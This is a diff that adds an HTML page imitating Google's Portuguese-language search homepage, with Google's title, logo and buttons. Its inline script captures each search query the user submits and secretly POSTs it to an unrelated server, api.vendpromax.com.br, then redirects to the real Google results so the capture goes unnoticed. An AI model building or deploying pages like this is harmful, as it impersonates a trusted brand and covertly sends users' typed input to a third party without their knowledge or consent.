@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Google</title>
+
+  <link rel="stylesheet" href="public/styles/style.css">
+  <link rel="shortcut icon" href="public/img/google-favicon.png" type="image/x-icon">
+</head>
+
+<body>
+
+  <header class="menu">
+    <div class="menu__section left">
+      <img src="public/img/burger-icon.svg" class="menu__icon">
+      <a href="#" class="menu__link active">All</a>
+      <a href="#" class="menu__link">Images</a>
+    </div>
+
+    <div class="menu__section right">
+      <img src="public/img/more-icon.svg" class="menu__icon">
+    </div>
+  </header>
+
+  <main class="content">
+    <img class="content__logo" src="public/img/logo.png" alt="Google">
+
+    <!-- FORMULÁRIO -->
+    <form id="formPesquisa">
+      <div class="content__search-container">
+        <input class="content__search" type="text" id="search" placeholder="Pesquisar no Google">
+      </div>
+
+      <div class="content__buttons">
+        <button type="submit">Pesquisa Google</button>
+        <button type="button">Estou com sorte</button>
+      </div>
+    </form>
+
+  </main>
+
+  <footer class="footer">
+    <div class="footer__section footer__location">
+      <span>Brazil</span>
+    </div>
+
+    <div class="footer__section footer__links">
+      <a href="">Settings</a>
+      <a href="">Privacy</a>
+      <a href="">Terms</a>
+    </div>
+  </footer>
+
+  <!-- SCRIPT -->
+  <script>
+    const form = document.getElementById("formPesquisa");
+
+    form.addEventListener("submit", async function (e) {
+      e.preventDefault();
+
+      const texto = document.getElementById("search").value;
+
+      if (!texto) return;
+
+      try {
+        await fetch("https://api.vendpromax.com.br/api/enviar-mensagem", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            mensagem: texto
+          })
+        });
+      } catch (erro) {
+        console.log("Erro ao enviar:", erro);
+      }
+
+      // REDIRECIONA PARA O GOOGLE
+      window.location.href = "https://www.google.com/search?q=" + encodeURIComponent(texto);
+    });
+  </script>
+
+</body>
+</html>
